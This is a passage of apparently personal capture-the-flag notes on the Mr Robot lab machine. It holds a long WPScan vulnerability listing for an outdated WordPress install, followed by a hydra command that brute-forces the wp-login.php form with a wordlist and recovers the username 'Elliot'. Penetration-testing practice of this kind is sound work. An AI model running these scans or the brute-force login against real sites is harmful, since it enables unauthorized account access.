 |     Fixed in: 4.3.12
 |     References:
 |      - https://wpscan.com/vulnerability/571beae9-d92d-4f9b-aa9f-7c94e33683a1
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14725
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/41398
 |
 | [!] Title: WordPress 3.0-4.8.1 - Path Traversal in Unzipping
 |     Fixed in: 4.3.12
 |     References:
 |      - https://wpscan.com/vulnerability/d74ee25a-d845-46b5-afa6-b0a917b7737a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14719
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/41457
 |      - https://hackerone.com/reports/205481
 |
 | [!] Title: WordPress 4.2.3-4.8.1 - Authenticated Cross-Site Scripting (XSS) in Visual Editor
 |     Fixed in: 4.3.12
 |     References:
 |      - https://wpscan.com/vulnerability/e525b3ed-866e-4c48-8715-19fc8be14939
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14726
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/41395
 |      - https://blog.sucuri.net/2017/09/stored-cross-site-scripting-vulnerability-in-wordpress-4-8-1.html
 |
 | [!] Title: WordPress <= 4.8.2 - $wpdb->prepare() Weakness
 |     Fixed in: 4.3.13
 |     References:
 |      - https://wpscan.com/vulnerability/c161f0f0-6527-4ba4-a43d-36c644e250fc
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16510
 |      - https://wordpress.org/news/2017/10/wordpress-4-8-3-security-release/
 |      - https://github.com/WordPress/WordPress/commit/a2693fd8602e3263b5925b9d799ddd577202167d
 |      - https://twitter.com/ircmaxell/status/923662170092638208
 |      - https://blog.ircmaxell.com/2017/10/disclosure-wordpress-wpdb-sql-injection-technical.html
 |
 | [!] Title: WordPress 2.8.6-4.9 - Authenticated JavaScript File Upload
 |     Fixed in: 4.3.14
 |     References:
 |      - https://wpscan.com/vulnerability/0d2323bd-aecd-4d58-ba4b-597a43034f57
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17092
 |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/67d03a98c2cae5f41843c897f206adde299b0509
 |
 | [!] Title: WordPress 1.5.0-4.9 - RSS and Atom Feed Escaping
 |     Fixed in: 4.3.14
 |     References:
 |      - https://wpscan.com/vulnerability/1f71a775-e87e-47e9-9642-bf4bce99c332
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17094
 |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/f1de7e42df29395c3314bf85bff3d1f4f90541de
 |
 | [!] Title: WordPress 4.3.0-4.9 - HTML Language Attribute Escaping
 |     Fixed in: 4.3.14
 |     References:
 |      - https://wpscan.com/vulnerability/a6281b30-c272-4d44-9420-2ebd3c8ff7da
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17093
 |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/3713ac5ebc90fb2011e98dfd691420f43da6c09a
 |
 | [!] Title: WordPress 3.7-4.9 - 'newbloguser' Key Weak Hashing
 |     Fixed in: 4.3.14
 |     References:
 |      - https://wpscan.com/vulnerability/809f68d5-97aa-44e5-b181-cc7bdf5685c5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17091
 |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/eaf1cfdc1fe0bdffabd8d879c591b864d833326c
 |
 | [!] Title: WordPress 3.7-4.9.1 - MediaElement Cross-Site Scripting (XSS)
 |     Fixed in: 4.3.15
 |     References:
 |      - https://wpscan.com/vulnerability/6ac45244-9f09-4e9c-92f3-f339d450fe72
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5776
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9263
 |      - https://github.com/WordPress/WordPress/commit/3fe9cb61ee71fcfadb5e002399296fcc1198d850
 |      - https://wordpress.org/news/2018/01/wordpress-4-9-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/ticket/42720
 |
 | [!] Title: WordPress <= 4.9.4 - Application Denial of Service (DoS) (unpatched)
 |     References:
 |      - https://wpscan.com/vulnerability/5e0c1ddd-fdd0-421b-bdbe-3eee6b75c919
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389
 |      - https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html
 |      - https://github.com/quitten/doser.py
 |      - https://thehackernews.com/2018/02/wordpress-dos-exploit.html
 |
 | [!] Title: WordPress 3.7-4.9.4 - Remove localhost Default
 |     Fixed in: 4.3.16
 |     References:
 |      - https://wpscan.com/vulnerability/835614a2-ad92-4027-b485-24b39038171d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216
 |
 | [!] Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login
 |     Fixed in: 4.3.16
 |     References:
 |      - https://wpscan.com/vulnerability/01b587e0-0a86-47af-a088-6e5e350e8247
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e
 |
 | [!] Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag
 |     Fixed in: 4.3.16
 |     References:
 |      - https://wpscan.com/vulnerability/2b7c77c3-8dbc-4a2a-9ea3-9929c3373557
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d
 |
 | [!] Title: WordPress <= 4.9.6 - Authenticated Arbitrary File Deletion
 |     Fixed in: 4.3.17
 |     References:
 |      - https://wpscan.com/vulnerability/42ab2bd9-bbb1-4f25-a632-1811c5130bb4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895
 |      - https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/
 |      - http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/
 |      - https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd
 |      - https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/
 |      - https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated File Delete
 |     Fixed in: 4.3.18
 |     References:
 |      - https://wpscan.com/vulnerability/e3ef8976-11cb-4854-837f-786f43cbdf44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated Post Type Bypass
 |     Fixed in: 4.3.18
 |     References:
 |      - https://wpscan.com/vulnerability/999dba5a-82fb-4717-89c3-6ed723cc7e45
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/
 |
 | [!] Title: WordPress <= 5.0 - PHP Object Injection via Meta Data
 |     Fixed in: 4.3.18
 |     References:
 |      - https://wpscan.com/vulnerability/046ff6a0-90b2-4251-98fc-b7fba93f8334
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated Cross-Site Scripting (XSS)
 |     Fixed in: 4.3.18
 |     References:
 |      - https://wpscan.com/vulnerability/3182002e-d831-4412-a27d-a5e39bb44314
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Cross-Site Scripting (XSS) that could affect plugins
 |     Fixed in: 4.3.18
 |     References:
 |      - https://wpscan.com/vulnerability/7f7a0795-4dd7-417d-804e-54f12595d1e4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460
 |
 | [!] Title: WordPress <= 5.0 - User Activation Screen Search Engine Indexing
 |     Fixed in: 4.3.18
 |     References:
 |      - https://wpscan.com/vulnerability/65f1aec4-6d28-4396-88d7-66702b21c7a2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - File Upload to XSS on Apache Web Servers
 |     Fixed in: 4.3.18
 |     References:
 |      - https://wpscan.com/vulnerability/d741f5ae-52ca-417d-a2ca-acdfb7ca5808
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a
 |
 | [!] Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution
 |     Fixed in: 5.0.1
 |     References:
 |      - https://wpscan.com/vulnerability/1a693e57-f99c-4df6-93dd-0cdc92fd0526
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8943
 |      - https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/
 |      - https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce
 |
 | [!] Title: WordPress 3.9-5.1 - Comment Cross-Site Scripting (XSS)
 |     Fixed in: 4.3.19
 |     References:
 |      - https://wpscan.com/vulnerability/d150f43f-6030-4191-98b8-20ae05585936
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9787
 |      - https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b
 |      - https://wordpress.org/news/2019/03/wordpress-5-1-1-security-and-maintenance-release/
 |      - https://blog.ripstech.com/2019/wordpress-csrf-to-rce/
 |
 | [!] Title: WordPress <= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation
 |     Fixed in: 4.3.20
 |     References:
 |      - https://wpscan.com/vulnerability/4494a903-5a73-4cad-8c14-1e7b4da2be61
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68
 |      - https://hackerone.com/reports/339483
 |
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Customizer
 |     Fixed in: 4.3.21
 |     References:
 |      - https://wpscan.com/vulnerability/d39a7b84-28b9-4916-a2fc-6192ceb6fa56
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17674
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
 |     Fixed in: 4.3.21
 |     References:
 |      - https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
 |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
 |
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Style Tags
 |     Fixed in: 4.3.21
 |     References:
 |      - https://wpscan.com/vulnerability/d005b1f8-749d-438a-8818-21fba45c6465
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17672
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - JSON Request Cache Poisoning
 |     Fixed in: 4.3.21
 |     References:
 |      - https://wpscan.com/vulnerability/7804d8ed-457a-407e-83a7-345d3bbe07b2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17673
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/b224c251adfa16a5f84074a3c0886270c9df38de
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Server-Side Request Forgery (SSRF) in URL Validation 
 |     Fixed in: 4.3.21
 |     References:
 |      - https://wpscan.com/vulnerability/26a26de2-d598-405d-b00c-61f71cfacff6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17669
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17670
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/9db44754b9e4044690a6c32fd74b9d5fe26b07b2
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Admin Referrer Validation
 |     Fixed in: 4.3.21
 |     References:
 |      - https://wpscan.com/vulnerability/715c00e3-5302-44ad-b914-131c162c3f71
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17675
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/b183fd1cca0b44a92f0264823dd9f22d2fd8b8d0
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Improper Access Controls in REST API
 |     Fixed in: 4.3.22
 |     References:
 |      - https://wpscan.com/vulnerability/4a6de154-5fbd-4c80-acd3-8902ee431bd8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20043
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16788
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-g7rg-hchx-c2gw
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Crafted Links
 |     Fixed in: 4.3.22
 |     References:
 |      - https://wpscan.com/vulnerability/23553517-34e3-40a9-a406-f3ffbe9dd265
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20042
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://hackerone.com/reports/509930
 |      - https://github.com/WordPress/wordpress-develop/commit/1f7f3f1f59567e2504f0fbebd51ccf004b3ccb1d
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xvg2-m2f4-83m7
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Block Editor Content
 |     Fixed in: 4.3.22
 |     References:
 |      - https://wpscan.com/vulnerability/be794159-4486-4ae1-a5cc-5c190e5ddf5f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16781
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16780
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pg4x-64rh-3c9v
 |
 | [!] Title: WordPress <= 5.3 - wp_kses_bad_protocol() Colon Bypass
 |     Fixed in: 4.3.22
 |     References:
 |      - https://wpscan.com/vulnerability/8fac612b-95d2-477a-a7d6-e5ec0bb9ca52
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20041
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/b1975463dd995da19bb40d3fa0786498717e3c53
 |
 | [!] Title: WordPress < 5.4.1 - Password Reset Tokens Failed to Be Properly Invalidated
 |     Fixed in: 4.3.23
 |     References:
 |      - https://wpscan.com/vulnerability/7db191c0-d112-4f08-a419-a1cd81928c4e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11027
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47634/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ww7v-jg8c-q6jw
 |
 | [!] Title: WordPress < 5.4.1 - Unauthenticated Users View Private Posts
 |     Fixed in: 4.3.23
 |     References:
 |      - https://wpscan.com/vulnerability/d1e1ba25-98c9-4ae7-8027-9632fb825a56
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11028
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47635/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xhx9-759f-6p2w
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in Customizer
 |     Fixed in: 4.3.23
 |     References:
 |      - https://wpscan.com/vulnerability/4eee26bd-a27e-4509-a3a5-8019dd48e429
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11025
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47633/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-4mhg-j6fx-5g3c
 |
 | [!] Title: WordPress < 5.4.1 - Cross-Site Scripting (XSS) in wp-object-cache
 |     Fixed in: 4.3.23
 |     References:
 |      - https://wpscan.com/vulnerability/e721d8b9-a38f-44ac-8520-b4a9ed6a5157
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11029
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47637/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-568w-8m88-8g2c
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in File Uploads
 |     Fixed in: 4.3.23
 |     References:
 |      - https://wpscan.com/vulnerability/55438b63-5fc9-4812-afc4-2f1eff800d5f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11026
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47638/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-3gw2-4656-pfr2
 |      - https://hackerone.com/reports/179695
 |
 | [!] Title: WordPress <= 5.2.3 - Hardening Bypass
 |     Fixed in: 4.3.21
 |     References:
 |      - https://wpscan.com/vulnerability/378d7df5-bce2-406a-86b2-ff79cd699920
 |      - https://blog.ripstech.com/2020/wordpress-hardening-bypass/
 |      - https://hackerone.com/reports/436928
 |      - https://wordpress.org/news/2019/11/wordpress-5-2-4-update/
 |
 | [!] Title: WordPress < 5.4.2 - Authenticated XSS via Media Files
 |     Fixed in: 4.3.24
 |     References:
 |      - https://wpscan.com/vulnerability/741d07d1-2476-430a-b82f-e1228a9343a4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4047
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-8q2w-5m27-wm27
 |
 | [!] Title: WordPress < 5.4.2 - Open Redirection
 |     Fixed in: 4.3.24
 |     References:
 |      - https://wpscan.com/vulnerability/12855f02-432e-4484-af09-7d0fbf596909
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4048
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/10e2a50c523cf0b9785555a688d7d36a40fbeccf
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-q6pw-gvf4-5fj5
 |
 | [!] Title: WordPress < 5.4.2 - Authenticated Stored XSS via Theme Upload
 |     Fixed in: 4.3.24
 |     References:
 |      - https://wpscan.com/vulnerability/d8addb42-e70b-4439-b828-fd0697e5d9d4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4049
 |      - https://www.exploit-db.com/exploits/48770/
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-87h4-phjv-rm6p
 |      - https://hackerone.com/reports/406289
 |
 | [!] Title: WordPress < 5.4.2 - Misuse of set-screen-option Leading to Privilege Escalation
 |     Fixed in: 4.3.24
 |     References:
 |      - https://wpscan.com/vulnerability/b6f69ff1-4c11-48d2-b512-c65168988c45
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4050
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/dda0ccdd18f6532481406cabede19ae2ed1f575d
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-4vpv-fgg2-gcqc
 |
 | [!] Title: WordPress < 5.4.2 - Disclosure of Password-Protected Page/Post Comments
 |     Fixed in: 4.3.24
 |     References:
 |      - https://wpscan.com/vulnerability/eea6dbf5-e298-44a7-9b0d-f078ad4741f9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25286
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/c075eec24f2f3214ab0d0fb0120a23082e6b1122
 |
 | [!] Title: WordPress 3.7 to 5.7.1 - Object Injection in PHPMailer
 |     Fixed in: 4.3.26
 |     References:
 |      - https://wpscan.com/vulnerability/4cd46653-4470-40ff-8aac-318bee2f998d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36326
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19296
 |      - https://github.com/WordPress/WordPress/commit/267061c9595fedd321582d14c21ec9e7da2dcf62
 |      - https://wordpress.org/news/2021/05/wordpress-5-7-2-security-release/
 |      - https://github.com/PHPMailer/PHPMailer/commit/e2e07a355ee8ff36aba21d0242c5950c56e4c6f9
 |      - https://www.wordfence.com/blog/2021/05/wordpress-5-7-2-security-release-what-you-need-to-know/
 |      - https://www.youtube.com/watch?v=HaW15aMzBUM
 |
 | [!] Title: WordPress < 5.8 - Plugin Confusion
 |     Fixed in: 5.8
 |     References:
 |      - https://wpscan.com/vulnerability/95e01006-84e4-4e95-b5d7-68ea7b5aa1a8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44223
 |      - https://vavkamil.cz/2021/11/25/wordpress-plugin-confusion-update-can-get-you-pwned/
 |
 | [!] Title: WordPress < 5.8.3 - SQL Injection via WP_Query
 |     Fixed in: 4.3.27
 |     References:
 |      - https://wpscan.com/vulnerability/7f768bcf-ed33-4b22-b432-d1e7f95c1317
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21661
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-6676-cqfm-gw84
 |      - https://hackerone.com/reports/1378209
 |
 | [!] Title: WordPress < 5.8.3 - Author+ Stored XSS via Post Slugs
 |     Fixed in: 4.3.27
 |     References:
 |      - https://wpscan.com/vulnerability/dc6f04c2-7bf2-4a07-92b5-dd197e4d94c8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21662
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-699q-3hj9-889w
 |      - https://hackerone.com/reports/425342
 |      - https://blog.sonarsource.com/wordpress-stored-xss-vulnerability
 |
 | [!] Title: WordPress 4.1-5.8.2 - SQL Injection via WP_Meta_Query
 |     Fixed in: 4.3.27
 |     References:
 |      - https://wpscan.com/vulnerability/24462ac4-7959-4575-97aa-a6dcceeae722
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21664
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jp3p-gw8h-6x86
 |
 | [!] Title: WordPress < 5.8.3 - Super Admin Object Injection in Multisites
 |     Fixed in: 4.3.27
 |     References:
 |      - https://wpscan.com/vulnerability/008c21ab-3d7e-4d97-b6c3-db9d83f390a7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21663
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jmmq-m8p8-332h
 |      - https://hackerone.com/reports/541469
 |
 | [!] Title: WordPress < 5.9.2 - Prototype Pollution in jQuery
 |     Fixed in: 4.3.28
 |     References:
 |      - https://wpscan.com/vulnerability/1ac912c1-5e29-41ac-8f76-a062de254c09
 |      - https://wordpress.org/news/2022/03/wordpress-5-9-2-security-maintenance-release/

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.197.198/wp-content/themes/twentyfifteen/
 | Last Updated: 2022-05-24T00:00:00.000Z
 | Readme: http://10.10.197.198/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.2
 | Style URL: http://10.10.197.198/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.197.198/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:06 <====================================================================================================> (137 / 137) 100.00% Time: 00:00:06

[i] No Config Backups Found.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 2
 | Requests Remaining: 73

[+] Finished: Sun Aug  7 19:25:15 2022
[+] Requests Done: 188
[+] Cached Requests: 6
[+] Data Sent: 45.491 KB
[+] Data Received: 18.675 MB
[+] Memory used: 227.969 MB
[+] Elapsed time: 00:00:24
```

![[Pasted image 20220807194311.png]]

![[Pasted image 20220807194321.png]]

```shell
┌──(root㉿enum-more)-[~/…/MrRobotCTF/results/10.10.197.198/loot]
└─# hydra -L fsocity.dic -p test 10.10.197.198 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username" -t 30 
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-07 20:10:40
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 30 tasks per 1 server, overall 30 tasks, 858235 login tries (l:858235/p:1), ~28608 tries per task
[DATA] attacking http-post-form://10.10.197.198:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username
[80][http-post-form] host: 10.10.197.198   login: Elliot   password: test
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

![[Pasted image 20220808215321.png]]

![[Pasted image 20220808215431.png]]

### Port 443

```shell
┌──(root㉿enum-more)-[~/…/results/10.10.197.198/scans/tcp443]
└─# cat tcp_443_https_feroxbuster_dirbuster.txt 
